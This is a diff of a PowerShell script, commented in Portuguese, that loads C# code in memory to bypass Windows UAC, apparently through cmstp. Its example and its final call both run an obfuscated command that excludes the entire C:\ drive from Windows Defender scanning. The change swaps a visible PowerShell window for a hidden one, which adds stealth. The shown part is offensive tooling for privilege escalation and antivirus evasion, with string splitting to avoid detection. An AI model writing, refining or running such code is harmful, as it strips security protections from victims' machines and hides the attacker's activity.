@@ -14,7 +14,6 @@ Este script usa código em C# para ser carregado na memória com PowerShell usan
 .EXAMPLE
 latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
 
-
 #>
 
 param(
@@ -148,7 +147,7 @@ try {
 
 if ($latencyxExecutable.Contains("powershell")) {
     if ($latencyxCommand -ne "") {
-        $latencyxFinal = "powershell -NoExit -c ""$latencyxCommand"""
+        $latencyxFinal = "powershell -WindowStyle Hidden -c ""$latencyxCommand"""  # Oculta a janela do PowerShell
     } else {
         $latencyxFinal = "$latencyxExecutable $latencyxCommand"
     }
@@ -191,6 +190,5 @@ if ($latencyxProcess -eq "cmstp") {
 
 }
 
-# Agora fora da função, você pode chamar diretamente a função com o comando desejado:
+# Chamada da função
 latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
-
